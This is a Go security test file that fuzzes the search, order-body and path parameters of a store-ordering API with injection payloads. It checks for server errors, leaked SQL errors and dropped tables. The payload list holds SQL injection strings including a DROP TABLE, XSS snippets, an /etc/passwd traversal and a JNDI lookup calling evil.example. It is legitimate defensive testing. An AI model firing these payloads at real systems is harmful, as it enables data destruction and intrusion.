//go:build security

package security_test

import (
	"net/http"
	"strings"
	"testing"

	"github.com/stevenwilliam/ruuma/test/testenv"
)

// payloads are the shapes that break naive string-built SQL, naive rendering
// and naive path handling (docs/12, A03).
var payloads = []string{
	"' OR '1'='1",
	"'; DROP TABLE orders; --",
	"1; SELECT pg_sleep(5)--",
	"\" OR \"\"=\"",
	"admin'--",
	"%27%20OR%201=1",
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"../../../../etc/passwd",
	"${jndi:ldap://evil.example/a}",
	"\x00truncated",
	strings.Repeat("A", 5000),
}

// TestSearchInputsAreParameterised_docs12_A03 fuzzes every search box's query
// parameter. Nothing may 500, and the data must survive.
func TestSearchInputsAreParameterised_docs12_A03(t *testing.T) {
	env := testenv.New(t)
	f := env.Fixtures
	admin := env.StaffToken(f.Admin, "admin")

	endpoints := []string{
		"/api/v1/stores?q=",
		"/api/v1/menu?store_id=" + f.StoreA.String() + "&q=",
		"/api/v1/categories?q=",
		"/api/v1/admin/stores?q=",
		"/api/v1/admin/users?q=",
		"/api/v1/admin/sys-parameters?q=",
		"/api/v1/admin/audit-log?q=",
		"/api/v1/finance/payments?q=",
		"/api/v1/ops/orders?q=",
	}

	for _, endpoint := range endpoints {
		for _, payload := range payloads {
			res := env.Do(http.MethodGet, endpoint+urlEncode(payload), admin, nil)
			if res.Status >= 500 {
				t.Errorf("%s with %q: %d %s", endpoint, truncate(payload), res.Status, res.Raw)
			}
			if strings.Contains(strings.ToLower(res.Raw), "syntax error") {
				t.Errorf("%s with %q leaked a SQL error", endpoint, truncate(payload))
			}
		}
	}

	// The tables are still there and still populated — a dropped table would
	// make the earlier assertions meaningless.
	var stores int64
	if err := env.DB.Raw(`SELECT count(*) FROM stores`).Scan(&stores).Error; err != nil {
		t.Fatalf("stores table: %v", err)
	}
	if stores == 0 {
		t.Fatal("the stores table is empty after fuzzing")
	}
}

// TestBodyFieldsAreValidated_docs12_A03 pushes the same payloads through JSON
// bodies rather than query strings.
func TestBodyFieldsAreValidated_docs12_A03(t *testing.T) {
	env := testenv.New(t)
	f := env.Fixtures
	token := env.CustomerToken(f.Customer)
	slot := env.MakeSlot(f.StoreA, "pickup", 12, 0, 5, 100)

	for _, payload := range payloads {
		body := env.OrderBody(f.StoreA, slot)
		body["contact_name"] = payload
		body["notes"] = payload

		res := env.Idempotent(http.MethodPost, "/api/v1/orders", token, body)
		if res.Status >= 500 {
			t.Errorf("order with %q: %d %s", truncate(payload), res.Status, res.Raw)
		}
	}
}

// TestPathParametersAreValidated_docs12_A03 — a non-UUID id is a 404, never a
// database error.
func TestPathParametersAreValidated_docs12_A03(t *testing.T) {
	env := testenv.New(t)
	token := env.CustomerToken(env.Fixtures.Customer)

	for _, payload := range []string{"' OR 1=1--", "../admin", "%2e%2e%2f", "null", "0"} {
		res := env.Do(http.MethodGet, "/api/v1/orders/"+urlEncode(payload), token, nil)
		if res.Status >= 500 {
			t.Errorf("order id %q: %d %s", payload, res.Status, res.Raw)
		}
	}
}

func urlEncode(s string) string {
	replacer := strings.NewReplacer(
		"%", "%25", " ", "%20", "'", "%27", "\"", "%22", "<", "%3C", ">", "%3E",
		"#", "%23", "&", "%26", "+", "%2B", "/", "%2F", "?", "%3F", "\x00", "",
	)
	return replacer.Replace(s)
}

func truncate(s string) string {
	if len(s) > 40 {
		return s[:40] + "…"
	}
	return s
}
